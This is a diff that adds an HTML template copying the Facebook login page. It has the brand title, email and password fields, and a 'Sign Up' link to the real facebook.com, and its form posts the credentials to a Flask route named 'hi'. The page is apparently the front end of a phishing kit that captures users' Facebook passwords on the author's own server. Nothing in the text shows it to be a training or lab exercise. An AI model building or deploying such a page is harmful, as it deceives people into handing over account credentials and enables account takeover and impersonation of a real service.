@@ -1,0 +1,18 @@
+<html lang="en">
+<head>
+    <title>Facebook - Log In</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+<body>
+    <div class="login_box">
+        <h1 class="title">facebook</h1><br>
+     <form action="{{url_for('hi')}}" method="post">
+       <input class="text" type="email" name="username" placeholder="Email address or phone number"required><br>
+        <input class="text"type="password" name="password" placeholder="Password"required><br>
+        <button><i class="fa fa-lock"></i>Login</button><br>
+     </form>
+         <p class="no_acc">Don't have an account?<a class="sign_up"href="https://www.facebook.com"> Sign Up</a></p><br>
+     </div>
+</body>
+</html>
